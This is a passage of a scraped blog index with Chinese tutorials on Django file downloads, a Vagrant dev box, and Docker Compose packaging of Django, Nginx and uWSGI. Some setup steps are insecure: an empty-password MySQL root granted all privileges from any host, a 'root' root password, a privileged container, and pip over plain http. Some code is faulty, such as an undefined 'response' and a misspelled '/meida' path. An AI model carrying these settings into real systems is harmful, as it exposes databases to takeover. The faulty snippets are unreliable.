os.path.dirname(os.path.abspath(__file__)) PROJECT_DIR, PROJECT_MODULE_NAME = os.path.split(PROJECT_ROOT) MEDIA_ROOT = os.path.join(PROJECT_DIR, \u0026#39;media/\u0026#39;) 5.2 MEDIA_URL MEDIA_URL 是指从浏览器访问时的 URL 前缀，例如：\n1 2 MEDIA_ROOT=\u0026#39;C:\\media\\\u0026#39; MEDIA_URL=\u0026#39;/mymedia/\u0026#39; 当浏览器访问：http://localhost/mymedia/1.png 就是访问 c:\\media\\1.png\n6. 参考 http://www.jianshu.com/p/727dc7631274 ","description":"","id":497,"section":"post","tags":["博文","Django","前端","文件","Python"],"title":"Django 静态文件处理","uri":"https://www.chenshaowen.com/blog/django-static-file-processing.html"},{"content":"1. 直接返回文件 如果静态文件在工程根目录的 media/test.zip，需要先将文件读入内存，再进行传输。代码如下：\nsettings.py 配置\n1 2 PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__)) MEDIA_ROOT = os.path.join(PROJECT_ROOT, \u0026#39;media/\u0026#39;) yourapp/views.py\n1 2 3 4 5 6 7 8 9 10 11 12 from django.conf import settings from django.http import HttpResponse from django.core.files.storage import FileSystemStorage def download_file_direct_from_file(request): file_system = FileSystemStorage(settings.MEDIA_ROOT) file_name = \u0026#39;test.zip\u0026#39; with file_system.open(file_name) as f: response = HttpResponse(f) response[\u0026#39;Content-Type\u0026#39;] = \u0026#39;application/%s\u0026#39; % file_name.split(\u0026#39;.\u0026#39;)[-1] response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=\u0026#34;%s\u0026#34;\u0026#39;% file_name return response 如果是从 API 调用，第三方获取的文件，那么只需要将 with file_system.open(file_name) as f 中的变量，f，赋值为请求到的文件体即可，如：f = requests.get(url).content。下面的代码示例，就不一一说明了，仅以下载本地文件为例。\n2. 返回流式的文件 Django 的 HttpResponse 对象支持以迭代器作为初始化参数，将文件对象替换为一个迭代器或生成器，可以优化 Django 对大文件的处理。同时，Django 提供了 StreamingHttpResponse 对象取代 HttpResponse 对象，以支持以流的形式发送文件给浏览器。\n可以自己实现一个迭代器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from django.conf import settings from django.http import StreamingHttpResponse def download_file_direct(request): file_name = \u0026#39;test.zip\u0026#39; full_path_file_name = \u0026#39;\u0026#39;.join([settings.MEDIA_ROOT, file_name]) def file_read(full_path_name, chunk_size=512): with open(full_path_name, \u0026#39;rb\u0026#39;) as f: while True: chunks = f.read(chunk_size) if chunks: yield chunks else: break response = StreamingHttpResponse(file_read(full_path_file_name)) response[\u0026#39;Content-Type\u0026#39;] = \u0026#39;application/octet-stream\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=%s\u0026#39; % (file_name) return response 也可以使用 Django 提供的 FileWrapper 类来迭代器化文件对象。\n1 2 3 4 5 6 7 8 9 10 11 12 from django.conf import settings from django.core.files.storage import FileSystemStorage from django.core.servers.basehttp import FileWrapper from django.http import StreamingHttpResponse def download_file_chunk_from_file(request): file_system = FileSystemStorage(settings.MEDIA_ROOT) file_name = \u0026#39;test.zip\u0026#39; response = StreamingHttpResponse(FileWrapper(file_system.open(file_name, \u0026#39;rb\u0026#39;), 512)) response[\u0026#39;Content_Type\u0026#39;] = \u0026#39;application/octet-stream\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=%s\u0026#39; % file_name return response 3. 利用 sendfile 机制 Django 处理文件时，需要将文件内容读入到内存，再将内存中的内容发送给浏览器。Django 对文件的转发处理能力远比不上 Nginx。比较好的方法是，使用 Django 做权限判断，然后设置 Nginx 转发文件。\nsendfile 是一种高性能网络 IO 的方式，利用操作系统内核的 sendfile 调用，可以将文件内容直接推送到网卡的 buffer，避免了应用层读写文件的开销。而在 Nginx 中，可以通过 X-Accel-Redirect 的特性来实现 sendfile 机制的文件处理。\nNginx 配置\n1 2 3 4 location /media { internal; alias /var/www/my_django_project_root/media; } views.py\n1 2 3 4 5 6 7 8 9 from django.conf import settings from django.http import HttpResponse def download_file_from_nginx(request): file_name = \u0026#39;test.zip\u0026#39; response[\u0026#39;Content_Type\u0026#39;]=\u0026#39;application/octet-stream\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=%s\u0026#39; % (file_name) response[\u0026#39;X-Accel-Redirect\u0026#39;] = \u0026#39;/media/%s\u0026#39; % file_name return response 4. 参考 http://boto.readthedocs.io/en/latest/ref/s3.html https://www.peterbe.com/plog/fastest-way-to-download-a-file-from-s3 http://www.cnblogs.com/linxiyue/p/4187484.html ","description":"","id":498,"section":"post","tags":["博文","Python","Django","大文件","网络","Demo"],"title":"Django 大文件传输","uri":"https://www.chenshaowen.com/blog/django-big-file-transfer.html"},{"content":" Docker 解决了同一机器上的环境隔离问题，提高了运维部署的效率。 Vagrant 给开发提供一个统一的开发、测试、接近于完全隔离的环境。本文，主要讨论如何使用 Vagrant 搭建 Django 开发环境。版本：VirtualBox 5.0，Vagrant 1.8。\n1. 基本概念 1.1 Vagrant Vagrant 是一个用来构建虚拟开发环境的工具，其本身并不提供虚拟化功能，而是通过管理虚拟机以实现开发环境的构建。Vagrant 基于 Ruby ，主要以命令行的方式运行。\nVagrant 底层支持 VirtualBox、VMware 甚至 AWS 作为虚拟机系统，可以非常方便地设置各种虚拟机环境。\n1.2 Boxes Boxes 是一个后缀为 box 的文件，实际上它是一个包含了虚拟机配置、虚拟机硬盘镜像和 Vagrant 配置的压缩包。\n2. 使用 Vagrant 2.1 安装 Vagrant 安装 VirtualBox， https://www.virtualbox.org/ 安装 Vagrant， https://www.vagrantup.com/ 2.2 选择镜像并启动 通常，需要基于某一个基础镜像去构建需要的软件环境，比如，CentOS、Ubuntu 等。\n官网上提供了大量的镜像， 可以前往 http://www.vagrantbox.es/ 选择合适的镜像 Boxes 文件。\n第一步，添加 box\n1 vagrant box add name path 这里的 name 是给 path 指向的 Boxes 的本地名称， path 使用远程的 URL 或者 本地路径均可。\n第二步，初始化环境\n1 vagrant init name 使用 name 镜像初始化当前目录，在工作目录创建一个 Vagrantfile 配置文件。\n第三步，启动环境\n1 vagrant up 启动一个虚拟机。虚拟机是使用 Boxes 文件创建的，首先根据 Vagrantfile 文件中 config.vm.box 的配置找到 Boxes 文件，如果本地没有，将会从官网查找下载。\n第四步，SSH 登录\nWindows 终端并不支持 ssh，所以需要安装第三方 SSH 客户端。笔者使用的是 Xshell。\n2.3 常用 Vagrant 命令 1 2 3 4 5 6 7 8 9 vagrant box list # 列出本地所有的 Boxes vagrant package # 打包 vagrant init # 初始化 vagrant up # 启动虚拟机 vagrant halt # 关闭虚拟机 vagrant reload # 重启虚拟机 vagrant ssh # SSH 至虚拟机 vagrant status # 查看虚拟机运行状态 vagrant destroy # 销毁当前虚拟机 2.4 配置代理 针对无法自由访问外网的开发环境，可以通过配置代理解决网络问题。\n1 2 3 4 # Linux \u0026amp;\u0026amp; OS X 下 export http_proxy=http://proxy.xx.com # Windows 下 set http_proxy=http://proxy.xx.com 安装 vagrant-proxyconf\n1 vagrant plugin install vagrant-proxyconf 配置 Vagrantfile\n全局配置\n新建 $HOME/.vagrant.d/Vagrantfile，编辑内容\n1 2 3 4 5 6 7 Vagrant.configure(\u0026#34;2\u0026#34;) do |config| if Vagrant.has_plugin?(\u0026#34;vagrant-proxyconf\u0026#34;) config.proxy.http = \u0026#34;http://proxy.xx.com\u0026#34; config.proxy.https = \u0026#34;http://proxy.xx.com\u0026#34; end # ... other stuff end 2.5 Vagrant 的网络配置 Vagrant 通过配置文件能够支持 VirtualBox 的 NAT、Bridged 以及 Hostonly 网络。\nNAT 网络 默认情况，Vagrant 建立的 VM 具有一个 NAT 网卡。\nBridged 网络 当采用如下配置语句时，Vagrant 建立的 VM 具有一个 Bridged 网络\n1 config.vm.network \u0026#34;public_network\u0026#34; 此时，VM 在宿主机所在的 LAN 中相当于一台物理机器。可以通过路由器的 MAC 绑定，为 VM 保留一个固定的 DHCP 地址，这样 VM 无论何时启动都会获取到相同的IP地址。\nHostonly 网络 当采用如下配置语句时，Vagrant 建立的 VM 具有两个 Hostonly 网络\n1 2 config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.9.10\u0026#34; config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.10\u0026#34; 混合网络 当采用如下配置语句时，Vagrant 建立的 VM 具有一个 NAT 和一个 Hostonly 网络\n1 config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.10\u0026#34; 标识符 private_network 总是被映射为 VirtualBox 的 Hostonly 模型。\nVagrant 在创建网卡时，如果配置文件仅配置了一个 private_network，则 Vagrant 自动创建 NAT 网卡，然后在创建配置文件所描述的网络；而如果配置文件指定了两个以上的 private_network 的话，Vagrant 不再自动创建 NAT 网卡了。\n混合网络非常适合开发和测试环境，可以通过 NAT 和 Internet 相通，多个 VM 之间也能相互通信。\n内外网络 当采用如下配置语句时，Vagrant 建立的 VM 具有一个 Bridged 和一个 Hostonly 网络\n1 2 config.vm.network \u0026#34;public_network\u0026#34; config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.10\u0026#34; 这是比较通用的配置模式，VM 既有 Host 主机所在局域网的 IP ，又有一个私有网络的 IP 地址，因此这些 VM 之间具有全连通性。\n2.6 端口转发 当采用如下配置语句时，Vagrant 将 host 机器上 80 端口的访问请求转发到虚拟机的 80 端口的服务上\n1 config.vm.network :forwarded_port, guest: 80, host: 80 例如，在虚拟机上使用 Nginx 跑了一个 Django 应用，那么在 host 机器上的浏览器中打开http://localhost:80 时，Vagrant 就会把这个请求转发到 VM 里面跑在 80 端口的 Nginx 服务上，因此可以通过这个设置设定 host 和 VM 之间，或是 VM 和 VM 之间的信息交互。\n2.7 挂载目录 Vagrant 启动时，默认将当前目录挂载在 /vagrant。 还可以通过配置来设置额外的挂载目录：\n1 config.vm.synced_folder \u0026#34;D:\\\\vagrant\\\\app\u0026#34;, \u0026#34;/var/www\u0026#34; 上面这个设定，第一个参数是主机的目录，第二个参数是虚拟机挂载的目录\n3. Django 的 Vagrant 环境 3.1 本地安装 从 http://pypi.o.tc.com/vagrant/xx-django1.8-u3.box 下载 Box 文件 xx-django1.8-u3.box。这个镜像包含了MySQL、RabbitMQ 等 Django 开发所需环境。数据库 root 账户默认密码为空。\n1 2 3 4 5 6 7 8 9 10 11 12 13 vagrant box add django xx-django1.8-u3.box ==\u0026gt; box: Box file was not detected as metadata. Adding it directly... ==\u0026gt; box: Adding box \u0026#39;django\u0026#39; (v0) for provider: box: Unpacking necessary files from: file://E:/vagrant/xx-django1.8-u3.box box: ==\u0026gt; box: Successfully added box \u0026#39;django\u0026#39; (v0) for \u0026#39;virtualbox\u0026#39;! mkdir django cd django vagrant init django A `Vagrantfile` has been placed in this directory. You are now ready to `vagrant up` your first virtual environment! Please read the comments in the Vagrantfile as well as documentation on `vagrantup.com` for more information on using Vagrant. 3.2 Vagrantfile 配置 1 2 3 4 5 6 7 8 9 10 11 12 Vagrant.configure(2) do |config| config.vm.box = \u0026#34;django\u0026#34; # 配置网络 config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.12.34\u0026#34; # 端口映射 config.vm.network \u0026#34;forwarded_port\u0026#34;, guest: 3306, host: 3306 config.vm.network \u0026#34;forwarded_port\u0026#34;, guest: 8000, host: 8000 config.ssh.username = \u0026#34;vagrant\u0026#34; config.ssh.password = \u0026#34;vagrant\u0026#34; end 宿主机 hosts 配置，便于使用域名直接访问\n1 192.168.12.34 vagrant.localhost. 1 2 3 4 5 6 7 8 9 10 11 vagrant up Bringing machine \u0026#39;default\u0026#39; up with \u0026#39;virtualbox\u0026#39; provider... ... ==\u0026gt; default: Forwarding ports... default: 3306 (guest) =\u0026gt; 3307 (host) (adapter 1) default: 8000 (guest) =\u0026gt; 8000 (host) (adapter 1) default: 22 (guest) =\u0026gt; 2222 (host) (adapter 1) ... default: SSH address: 127.0.0.1:2222 default: SSH username: vagrant ... 使用账户 vagrant:vagrant SSH 登录 127.0.0.1:2222。\n3.3 Django 配置 Vagrant 默认将本地目录挂载在 /vagrant 目录。在本地目录新建 app 目录，将 Django 工程拷贝到 app 中。\n切换到应用工作目录\n1 cd /vagrant/app/ 安装依赖包\n1 pip install -r requirements.txt --index=http://mirrors.aliyun.com/pypi/simple --trusted-host mirrors.aliyun.com 创建数据库\n1 2 mysql -u root -p create database `database_name` default character set utf8 collate utf8_general_ci; 启动 Django\n1 2 3 python manage.py migrate python manage.py runserver 0.0.0.0:8000 # 运行 Django python manage.py celery worker -l info # 启动另外一个窗口，运行 celery 后台任务 通过 Navicat 访问数据库需要授权\n1 2 3 mysql -u root -p # 默认 root 密码为空 GRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; WITH GRANT OPTION; FLUSH PRIVILEGES; 4. 参考 https://blog.hedzr.com/2017/05/02/vagrant-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ ","description":"","id":499,"section":"post","tags":["博文","Django","Vagrant","工具","开发"],"title":"Vagrant 搭建 Django 开发环境","uri":"https://www.chenshaowen.com/blog/build-django-development-environment-using-vagrant.html"},{"content":"1. 目录结构 django-devops-uwsgi 目录是打包 uWSGI 和 Django 的镜像编译文件。在镜像中安装 uWSGI、pip、virtualenv等必要的程序包。\n在使用镜像创建容器时，执行 start.sh 脚本， 创建 Python 虚拟运行环境，从 Django 的 requirements.txt 安装依赖包，最后启动 uWSGI 监听端口，等待请求。 django-devops-compose/www/app 目录，用于放置 Django 的代码。需要说明的是：为了减少工程的目录层级，通过改造，将 url、settings 等与工程全局相关的文件移动到了根目录。 django-devops-compose/www/conf 目录，用于存放 uWSGI 配置和环境变量。这里的环境变量有 pip 源地址等。 django-devops-compose/www/env 目录用于存放 virtualenv 创建的 Python 虚拟环境。这是为了避免，每次启动容器时，都需要重新安装依赖包，加快容器启动时间。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └── django-devops-uwsgi │ ├── Dockerfile │ └── start.sh ├── django-devops-compose │ ├── docker-compose.yml │ └── www │ ├── app │ │ ├── manage.py │ │ ├── requirements.txt │ │ ├── settings.py │ │ ├── static │ │ ├── urls.py │ │ ├── wsgi.py │ ├── conf │ │ ├── common.env │ │ ├── uwsgi.ini │ ├── env │ ├── log │ │ ├── mysql │ │ └── uwsgi 2. Dockerfile 镜像文件：django-devops-uwsgi/Dockerfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 FROM centos:7 RUN yum -y install epel-release RUN yum -y install gcc RUN yum -y install python-devel python-pip mysql-devel RUN pip install --upgrade pip RUN pip install virtualenv RUN yum -y install pcre pcre-devel pcre-static RUN yum -y clean all RUN mkdir /var/www COPY ./start.sh / RUN chmod +x /start.sh CMD [\u0026#34;/start.sh\u0026#34;] EXPOSE 8000 启动脚本文件：django-devops-uwsgi/start.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/bash echo \u0026#34;python virtual env ------ start\u0026#34; cd /var/www virtualenv ./env source ./env/bin/activate pip install uwsgi --index=http://${PYPI_SOURCE} --trusted-host ${PYPI_SOURCE%%/*} echo \u0026#34;python virtual env ------ end\u0026#34; echo \u0026#34;install requirements.txt ------ start\u0026#34; echo \u0026#34;pypi source, ${PYPI_SOURCE}\u0026#34; /var/www/env/bin/pip install -r /var/www/app/requirements.txt --index=http://${PYPI_SOURCE} --trusted-host ${PYPI_SOURCE%%/*} echo \u0026#34;install requirements.txt ------ end\u0026#34; cd /var/www/app echo \u0026#34;syncdb ------ start\u0026#34; python manage.py syncdb echo \u0026#34;syncdb ------ end\u0026#34; echo \u0026#34;migrate ------ start\u0026#34; python manage.py migrate echo \u0026#34;migrate ------ end\u0026#34; echo \u0026#34;uwsgi ------ start\u0026#34; uwsgi --master --ini /var/www/conf/uwsgi.ini echo \u0026#34;uwsgi ------ end\u0026#34; docker-compose.yml 配置文件:django-devops-compose/docker-compose.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 version: \u0026#39;2\u0026#39; services: nginx: build: ../django-devops-nginx/ volumes: - ./www/:/var/www/ links: - uwsgi ports: - \u0026#34;80:80\u0026#34; expose: - \u0026#34;80\u0026#34; uwsgi: # image: djangodevops_uwsgi build: ../django-devops-uwsgi/ privileged: true env_file: - ./www/conf/common.env volumes: - ./www/:/var/www/ depends_on: - mysql # - redis # - rabbitmq links: - mysql # - redis # - rabbitmq ports: - \u0026#34;8000:8000\u0026#34; expose: - \u0026#34;8000\u0026#34; mysql: image: mariadb restart: always ports: - \u0026#34;3306:3306\u0026#34; expose: - \u0026#34;3306\u0026#34; volumes: - ./www/mysql/:/var/lib/mysql/ environment: - MYSQL_ROOT_PASSWORD=root - MYSQL_DATABASE=app 环境变量文件：django-devops-compose/www/conf/common.env\n1 2 3 4 5 6 7 # Set environment # APP_NAME=app # DATABASE_NAME=app # MYSQL_USER=root # MYSQL_PASSWORD = PYPI_SOURCE=mirrors.aliyun.com/pypi/simple # PYPI_SOURCE=pypi.douban.com/simple uSWGI 配置文件：django-devops-compose/www/conf/uwsgi.ini\n1 2 3 4 5 6 7 8 9 10 [uwsgi] chmod-socket=666 socket = uwsgi:8000 chdir = /var/www/app/ logto = /var/www/log/uwsgi/uwsgi.log module = wsgi:application py-autoreload = 1 master = 1 processes = 2 threads = 2 3. 常用的一些命令 启动容器，Console 推出时，容器停止。\n1 docker run -p 800:80 imagename 后台启动容器，不占用 Console，后台运行。\n1 docker run -d -p 800:80 imagename 启动容器，并通过 ssh 登陆\n1 docker run -it --rm imagename /bin/bash 批量停止容器\n1 docker stop $(docker ps -q) 批量重启容器\n1 docker restart $(docker ps -q) 批量删除容器\n1 docker rm $(docker ps -a -q) 批量删除 :镜像\n1 docker rmi $(docker images -f \u0026#34;dangling=true\u0026#34; -q) 批量删除镜像\n1 docker rmi $(docker images -q) ","description":"","id":500,"section":"post","tags":["Docker","Django","服务","工具","博文"],"title":"从零开始使用 Docker 打包 Django 开发环境 (6) uWSGI、Django","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-6.html"},{"content":"1. 目录结构 1 2 3 4 5 6 7 8 9 10 11 12 ├── django-devops-nginx │ ├── Dockerfile │ └── nginx.repo ├── django-devops-compose │ ├── docker-compose.yml │ ├── www │ ├── conf │ │ ├── nginx.conf │ ├── log │ │ ├── nginx │ │ │ ├── access.log │ │ │ ├── error.log 每个服务的镜像 Dockerfile，单独放在一个文件夹。django-devops-compose 项目最终组装全部镜像，./www/ 目录被挂在到每个镜像的 /var/www/ 目录下，用于提供动态的配置信息、代码目录、数据目录、日志目录。\n2. Dockerfile 文件：django-devops-nginx/Dockerfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 FROM centos:7 ADD ./nginx.repo /etc/yum.repos.d/nginx.repo RUN yum install -y nginx RUN rm /etc/nginx/nginx.conf RUN ln -sf /var/www/conf/nginx.conf /etc/nginx/nginx.conf CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] EXPOSE 80 Nginx 源文件：django-devops-nginx/nginx.repo\n1 2 3 4 5 6 7 8 9 [nginx] name=nginx repo baseurl=http://nginx.org/packages/centos/\\$releasever/\\$basearch/ gpgcheck=0 enabled=1 django-devops-compose/docker-compose.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#39;2\u0026#39; services: nginx: build: ../django-devops-nginx/ volumes: - ./www/:/var/www/ # links: # - uwsgi ports: - \u0026#34;80:80\u0026#34; expose: - \u0026#34;80\u0026#34; www/conf/nginx.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 user nginx nginx; worker_processes 2; events { worker_connections 1024; use epoll; } http { include mime.types; default_type application/octet-stream; upstream django{ # server unix:///var/www/conf/uwsgi.sock; server uwsgi:8000; } server { listen 80; server_name 127.0.0.1; charset utf-8; root /var/www/app; access_log /var/www/log/nginx/access.log; error_log /var/www/log/nginx/error.log; location /meida { alias /var/www/app/media; } location /static { alias /var/www/app/static; } location / { # include /var/www/conf/uwsgi.params; include /etc/nginx/uwsgi_params; uwsgi_pass django; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } } 使用 docker-compose up 命令，启动项目之前，如果没有相关镜像，会自动构建镜像，然后启动容器。或者进入 docker-devops-nginx 目录，执行 docker build . ，也可以立即构建镜像。\n使用 docker images，查看当前主机上的镜像信息。\n1 2 REPOSITORY TAG IMAGE ID CREATED SIZE djangodevopscompose_nginx latest 253f527fa13c About a minute ago 275.6 MB 通过，http://127.0.0.1/static/index.html 就可以访问了。在本地 ./www/log/nginx/access.log 中可以看到访问的日志信息。\n3. 调试方法 3.1 ssh 登陆容器 启动容器，并通过 ssh 登陆 ：\n1 2 3 4 docker run -it --rm djangodevops_nginx /bin/bash [root@cb769cbf310d /]# uname -a Linux cb769cbf310d 3.10.0-514.26.2.el7.x86_64 #1 SMP Tue Jul 4 15:04:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 通过 ssh 登陆容器，可以使用 Linux 命令直接对容器进行操作。记录下，操作这些操作命令，用于 Dockerfile 文件的编写，能显著提高构建镜像的效率。\n3.2 查看日志 由于在 Nginx 的配置中，将日志目录设置在挂载目录中。可以在本地，直接查看日志调试。\n3.3 使用 Linux 作为开发主机 Docker 对 Windows 的支持不够友好，本人使用的是 CentOS 作为开发系统环境，打包镜像。一方便可以避免一些 Windows 的坑，Windows 下也是通过虚拟机提供的 Linux 环境运行 Docker；另一方面，由于 Dockerfile 定义的镜像的基础镜像通常也是 Linux ，如果主机也是 Linux，可以方便脚本的编写和调试。\n","description":"","id":501,"section":"post","tags":["博文","Docker","服务","工具","Django","Nginx"],"title":"从零开始使用 Docker 打包 Django 开发环境 (5) Nginx","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-5.html"},{"content":"1. 部署架构 浏览器访问一个页面的程序处理流程：\n(1)，浏览器向 Nginx 发起一个请求，如果匹配到 Nginx 的静态 URL，比如 /static 目录下的 js、css、404.html 等文件，那么 Nginx 直接返回文件。其他请求 URL，通过 uwsgi_pass 配置转给 uWSGI 处理。\n(2)，uWSGI 解析请求头、请求体，http 协议转为 wsgi协议内容，最后将请求转给 Django。\n(3)，Django 通过 URL 匹配，找到指定的 View 函数，访问 MySQL、Redis 等服务，组装一个 Response 返回给 uWSGI。\n(4)，uWSGI 根据返回 Response 生成响应头和响应体，uWSGI 协议转为 http 协议内容，最后将请求转给 Nginx。\n(5)，浏览器根据 Nginx 返回的内容，渲染在页面，呈现给用户。\n需要说明的是，Nginx 作为反向代理，提供了负载均衡的能力，同时，由于 Nginx 出色的静态文件服务能力，提高了系统的并发能力。uWSGI 通过多 work 提高了 Django 的并发能力，充分发挥了多核的优势。\n系统部署结构图如下：\nDocker Compose 提供多容器应用组装能力，可以将多个单独的容器，组装成一个整体。这里需要的容器有：\n一个 Nginx 容器 一个 uWSGI + Django 的容器 一个 MySQL 的容器 一个 Redis 的容器 一个 RabbitMQ 的容器 2. 文件的组织结构 整个项目分为六个部分\ndjango-devops-mysql 生成 MySQL 的镜像 django-devops-nginx 生成 Nginx 的镜像 django-devops-rabbitmq 生成 RabbitMQ 的镜像 django-devops-redis 生成 Redis 的镜像 django-devops-uwsgi 生成 uWSGI 和 Django 的镜像 django-devops-compose 编排上面的五个镜像，挂载目录，提供配置文件、日志、代码管理、运行环境等。 生成镜像目录中主要需要 Dockerfile 文件。django-devops-compose 目录中\nwww/app 目录存放 Django 的代码 www/conf 目录存放 MySQL 、uWSGI 等容器配置信息 www/env 目录存放 virtualenv 创建的 Python 虚拟运行环境 www/log 目录存放各种日志 docker-compose.yml 容器编排信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ├── django-devops-compose │ ├── docker-compose.yml │ ├── README.md │ ├── reset_data.sh │ ├── reset_docker.sh │ └── www │ ├── app │ │ ├── books_cbv │ │ ├── books_fbv │ │ ├── books_fbv_user │ │ ├── __init__.py │ │ ├── manage.py │ │ ├── README.md │ │ ├── requirements.txt │ │ ├── settings.py │ │ ├── static │ │ ├── urls.py │ │ ├── views.py │ │ ├── wsgi.py │ ├── conf │ │ ├── env │ │ ├── my.cnf │ │ ├── nginx.conf │ │ ├── uwsgi.ini │ │ ├── uwsgi.params │ │ └── uwsgi.sock │ ├── env │ │ ├── bin │ │ ├── include │ │ ├── lib │ │ ├── lib64 -\u0026gt; lib │ │ └── pip-selfcheck.json │ ├── log │ │ ├── mysql │ │ ├── nginx │ │ └── uwsgi │ └── mysql ├── django-devops-mysql │ ├── Dockerfile │ ├── mysql.repo │ └── start.sh ├── django-devops-nginx │ ├── Dockerfile │ └── nginx.repo ├── django-devops-rabbitmq │ └── Dockerfile ├── django-devops-redis │ └── Dockerfile └── django-devops-uwsgi ├── Dockerfile └── start.sh ","description":"","id":502,"section":"post","tags":["博文","Docker","服务","工具","Django"],"title":"从零开始使用 Docker 打包 Django 开发环境 (4) 项目组织","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-4.html"},{"content":"1. 基本概念 Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。使用 Docker Compose，可以在一个文件中定义一个多容器应用，然后使用一条命令来启动你的应用，完成一切准备工作。\nDocker Compose 定位是 \u0026lsquo;defining and running complex applications with Docker\u0026rsquo;，前身是 Fig，兼容 Fig 的模板文件。\nDocker Compose 发展至今，有 Version 1、Version 2、Version 3 三个大版本。如果不声明版本，默认为 Version 1。Version 1 不能使用 volumes,、networks、 build参数。Version 2，必须在版本中申明，所有的服务，都必须申明在 service 关键字下。Version 3 删除了 volume_driver、volumes_from、cpu_shares、cpu_quota、cpuset、mem_limit、memswap_limit、extends、group_add 关键字，新增了 deploy，全面支持 Swarm mode。更详细的比较可以查看参考链接。\n本文中主要以 Version 2 为例学习 Docker Compose 容器的编排。\n2. 工作原理 Docker Compose 将所管理的容器分为三层，工程（project），服务（service）以及容器（contaienr）。Docker Compose 运行的目录下的所有文件（docker-compose.yml、extends文件、环境变量文件等）组成一个工程，若无特殊指定工程名即为当前目录名。\n一个工程当中可包含多个服务，每个服务中定义了容器运行的镜像、参数、依赖。一个服务当中可包括多个容器实例，Docker Compose 并没有解决负载均衡的问题，因此需要借助其他工具实现服务发现及负载均衡。\nDocker Compose 的工程配置文件默认为 docker-compose.yml，可通过环境变量 COMPOSE_FILE 或 -f 参数自定义配置文件，其定义了多个有依赖关系的服务及每个服务运行的容器。以下是一个简单的配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 version: \u0026#39;2\u0026#39; services: web: build: . ports: - \u0026#34;80:90\u0026#34; volumes: - .:/code links: - redis redis: image: redis 其定义了两个服务 web 和 redis。web 服务的镜像需要使用当前目录的 Dockerfile 实时构建，其容器运行时需要在宿主机开放端口 80 并映射到容器端口 90 ，并且挂载存储卷 /code 以及关联服务\nredis。redis 服务通过镜像 redis 启动。\nDocker Compose 是由 Python 语言实现的，它通过调用 docker-py 库（可参考\nhttps://github.com/docker/docker-py ）与 docker engine 通信实现构建 docker 镜像，启动停止 docker 容器等。Docker-py 库调用 docker remote API（可参考\nhttps://docs.docker.com/reference/api/docker_remote_api/ ）与 Docker Daemon\n通信，可通过 DOCKER_HOST 配置本地或远程 Docker Daemon 的地址。\n3 Docker Compose 常用命令 命令 解释 docker-compose build 构建 yml 中服务的镜像 docker-compose ps 查看已经启动的服务状态 docker-compose kill 停止某个服务 docker-compose logs 可以查看某个服务的log docker-compose port 打印绑定的public port docker-compose pull pull服务镜像 docker-compose up 启动yml定义的所有服务 docker-compose stop 停止yml中定义的所有服务 docker-compose start 启动被停止的yml中的所有服务 docker-compose kill 强行停止yml中定义的所有服务 docker-compose rm 删除yml中定义的所有服务 docker-compose restart 重启yml中定义的所有服务 docker-compose scale 扩展某个服务的个数，可以向上或向下 docker-compose version 查看compose的版本 4. YAML 常用关键字 4.1 build 指定 Dockerfile 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 Compose 将会利用它自动构建这个镜像，然后使用这个镜像。\n1 build: /path/to/build/dir 4.2 command 覆盖容器启动后默认执行的命令。\n1 command: echo \u0026#34;hello world\u0026#34; 4.3 dockerfile 如果需要指定额外的编译镜像的 Dockefile 文件，可以通过该指令来指定。例如:\n1 dockerfile: Dockerfile-alternate 注意，该指令不能跟 image 同时使用，否则 Compose 将不知道根据哪个指令来生成最终的服务镜像。\n4.4 env_file 从文件中获取环境变量，可以为单独的文件路径或列表。\n如果通过 docker-compose -f FILE 方式来指定 Compose 模板文件，则 env_file 中变量的路径会基于模板文件路径。\n如果有变量名称与 environment 指令冲突，则按照惯例，以后者为准。\n1 2 3 4 5 6 env_file: .env env_file: - ./common.env - ./apps/web.env - /opt/secrets.env 环境变量文件中每一行必须符合格式，支持 # 开头的注释行。\n1 2 # common.env: Set development environment PROG_ENV=development 4.5 environment 设置环境变量。你可以使用数组或字典两种格式。\n只给定名称的变量会自动获取运行 Compose 